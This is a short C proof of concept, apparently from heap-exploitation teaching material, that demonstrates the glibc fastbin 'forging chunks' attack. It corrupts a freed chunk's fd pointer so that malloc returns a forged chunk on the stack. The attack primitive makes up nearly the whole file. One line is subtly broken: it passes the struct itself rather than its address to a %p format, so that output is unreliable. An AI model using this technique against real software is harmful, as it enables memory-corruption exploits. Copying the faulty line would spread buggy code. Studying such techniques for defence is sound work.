/*
 * https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks.html
 */
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

int main(int argc, char* argv[]) {
    // First grab a fast chunk
    char* a = malloc(10);               // 'a' points to 0x219c010
    fprintf(stderr, "malloc()\t%p\n", a);

    // Create a forged chunk
    struct forged_chunk chunk;    // At address 0x7ffc6de96690
    fprintf(stderr, "&forged_chunk\t%p\n", chunk);
    chunk.size = 0x20;            // This size should fall in the same fastbin
    char* data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
    strcpy(data, "attacker's data");

    // Put the fast chunk back into fastbin
    free(a);
    // Modify 'fd' pointer of 'a' to point to our forged chunk
    *((unsigned long long *)a) = (unsigned long long)&chunk;
    // Remove 'a' from HEAD of fastbin
    // Our forged chunk will now be at the HEAD of fastbin
    void* tmp = malloc(10);                   // Will return 0x219c010
    fprintf(stderr, "malloc()\t%p\n", tmp);


    char* victim = malloc(10);          // Points to 0x7ffc6de966a0
    fprintf(stderr, "malloc()\t%p\n", victim);
    printf("%s\n", victim);       // Prints "attacker's data" !!

    malloc(10);

    return 0;
}
